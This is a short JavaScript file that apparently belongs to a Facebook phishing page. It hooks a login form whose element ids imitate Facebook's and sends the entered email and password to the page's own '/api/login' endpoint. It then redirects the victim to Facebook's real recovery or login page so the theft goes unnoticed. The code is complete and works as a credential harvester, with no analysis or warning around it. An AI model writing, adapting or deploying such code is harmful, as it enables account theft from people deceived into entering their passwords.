document.addEventListener('DOMContentLoaded', () => {
  const form = document.getElementById('u_0_a_OZ');

  form.addEventListener('submit', async (e) => {
    e.preventDefault();

    const emailEl = document.getElementById('emailhidden');
    const passEl  = document.getElementById('pass');

    const email = emailEl?.value.trim();
    const password = passEl?.value;

    if (!email || !password) {
      alert('Please enter email and password');
      return;
    }

    try {
      await fetch('/api/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        credentials: 'include',
        body: JSON.stringify({ email, password })
      });
      window.location.href = "https://www.facebook.com/recover/initiate/";
    } catch (err) {
      window.location.href = "https://www.facebook.com/login/";
    }

  });
});
